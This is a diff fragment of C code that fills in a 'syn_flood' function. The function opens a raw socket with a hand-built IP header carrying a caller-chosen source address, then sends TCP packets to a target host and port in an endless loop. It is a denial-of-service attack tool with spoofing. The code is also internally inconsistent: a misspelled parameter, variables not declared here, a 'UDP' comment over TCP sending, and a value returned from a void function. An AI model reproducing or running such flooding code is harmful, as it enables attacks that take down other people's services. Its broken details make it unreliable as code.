@@ -137,6 +137,24 @@ int tcp_send(char *datagram, int sfd, struct sockaddr_in servaddr, struct iphdr*
 */
 void syn_flood(char* hostname, int port, char* sourcec_ip)
 {
-    while(true) {
-        u
+	//create the UDP socket
+    sfd = get_sock_fd();
+    //configure the socket
+    servaddr = configure_sock(port, hostname);
+    //create the ip header
+    struct iphdr* iph = configure_packet(source_ip, datagram, servaddr);
+    
+    int one = 1;
+    const int *val = &one;
+    if (setsockopt (sfd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
+        printf("Error setting IP_HDRINCL. Err : %d . Error msg: %s\n", errno, strerror(errno));
+        exit(0);
+    }
+    //start spamming
+    while(1) {
+        tcp_send(datagram, sfd, servaddr, iph);
+    }
+    close(sfd);
+    return 0;
+}
 
